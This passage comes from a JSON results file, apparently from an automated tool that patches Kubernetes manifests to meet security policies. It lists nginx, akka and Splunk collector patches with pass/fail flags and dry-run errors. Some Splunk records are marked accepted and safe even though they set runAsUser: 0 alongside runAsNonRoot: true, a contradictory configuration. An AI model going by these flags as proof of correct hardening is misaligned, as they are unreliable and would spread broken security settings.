    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9833\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01475",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9833\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01476",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9833\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01477",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9833\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01478",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello\nspec:\n  containers:\n  - image: felipeogutierrez/explore-akka:1.1\n    name: hello\n    imagePullPolicy: Always\n    args:\n    - '83.1'\n    ports:\n    - containerPort: 8001\n      name: http\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01479",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello\nspec:\n  containers:\n  - image: felipeogutierrez/explore-akka:1.1\n    name: hello\n    imagePullPolicy: Always\n    args:\n    - '83.1'\n    ports:\n    - containerPort: 8001\n      name: http\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01480",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello\nspec:\n  containers:\n  - image: felipeogutierrez/explore-akka:1.1\n    name: hello\n    imagePullPolicy: Always\n    args:\n    - '83.1'\n    ports:\n    - containerPort: 8001\n      name: http\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01481",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello\nspec:\n  containers:\n  - image: felipeogutierrez/explore-akka:1.1\n    name: hello\n    imagePullPolicy: Always\n    args:\n    - '83.1'\n    ports:\n    - containerPort: 8001\n      name: http\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01482",
    "policy_id": "no_latest_tag",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"restore-jenkins\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01483",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"restore-jenkins\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01484",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"restore-jenkins\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01485",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"restore-jenkins\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01486",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"restore-jenkins\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01487",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.7.9\n        ports:\n        - containerPort: 80\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01488",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.7.9\n        ports:\n        - containerPort: 80\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01489",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.7.9\n        ports:\n        - containerPort: 80\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01490",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.7.9\n        ports:\n        - containerPort: 80\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01491",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 128Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "errors": []
  },
  {
    "id": "01492",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 128Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "errors": []
  },
  {
    "id": "01493",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - 